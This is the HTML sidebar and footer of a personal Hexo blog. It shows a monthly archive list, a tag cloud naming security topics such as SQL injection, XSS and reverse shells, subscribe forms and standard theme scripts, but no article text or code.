class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/09/"><span class="level-start"><span class="level-item">September 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/08/"><span class="level-start"><span class="level-item">August 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/07/"><span class="level-start"><span class="level-item">July 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">May 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/04/"><span class="level-start"><span class="level-item">April 2022</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">March 2022</span></span><span class="level-end"><span class="level-item tag">15</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">February 2022</span></span><span class="level-end"><span class="level-item tag">17</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">January 2022</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/12/"><span class="level-start"><span class="level-item">December 2021</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/11/"><span class="level-start"><span class="level-item">November 2021</span></span><span class="level-end"><span class="level-item tag">12</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/10/"><span class="level-start"><span class="level-item">October 2021</span></span><span class="level-end"><span class="level-item tag">18</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/09/"><span class="level-start"><span class="level-item">September 2021</span></span><span class="level-end"><span class="level-item tag">18</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">August 2021</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/07/"><span class="level-start"><span class="level-item">July 2021</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/06/"><span class="level-start"><span class="level-item">June 2021</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">May 2021</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">April 2021</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">March 2021</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">February 2021</span></span><span class="level-end"><span class="level-item tag">22</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">January 2021</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">December 2020</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/11/"><span class="level-start"><span class="level-item">November 2020</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/10/"><span class="level-start"><span class="level-item">October 2020</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CSRF/"><span class="tag">CSRF</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/MYSQL/"><span class="tag">MYSQL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/XSS/"><span class="tag">XSS</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/bugku/"><span class="tag">bugku</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/bugku2/"><span class="tag">bugku2</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/hexo/"><span class="tag">hexo</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/html/"><span class="tag">html</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/html%E5%8E%9F%E7%90%86/"><span class="tag">html原理</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/php/"><span class="tag">php</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sqlmap/"><span class="tag">sqlmap</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sql%E6%B3%A8%E5%85%A5/"><span class="tag">sql注入</span><span class="tag">9</span></a></div><div class="control"><a class="tags has-addons" href="/tags/typro/"><span class="tag">typro</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xss/"><span class="tag">xss</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BC%B9shell/"><span class="tag">反弹shell</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="tag">文件上传</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="tag">文件包含</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tag">渗透测试</span><span class="tag">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe for updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">follow.it</h3><form action="" method="post" target="_blank"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="Tlife" height="28"></a><p class="is-size-7"><span>&copy; 2023 vague huang</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2019</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>